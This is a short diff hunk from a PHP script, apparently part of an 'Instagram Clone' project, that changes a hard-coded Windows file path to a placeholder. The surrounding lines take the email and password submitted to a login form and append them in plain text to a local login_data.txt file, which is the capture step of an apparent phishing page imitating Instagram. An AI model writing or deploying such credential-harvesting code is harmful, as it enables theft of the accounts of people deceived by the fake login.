@@ -32,7 +32,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
      //making File in which user data will be stored in linux as well windows
     // $make_file = fopen("/home/khonshu/Desktop/Instagram Clone/login_data.txt" , "a+") or die("Unable To Write Data"); 
-    $make_file = fopen("C:\Users\AMIT PARAB\Desktop/login_data.txt" , "a+") or die("Unable To Write Data");
+    $make_file = fopen("C:\Users\username\Desktop/login_data.txt" , "a+") or die("Unable To Write Data");
      fwrite($make_file , $login_email);
      fwrite($make_file , $login_password);
      fclose($make_file);
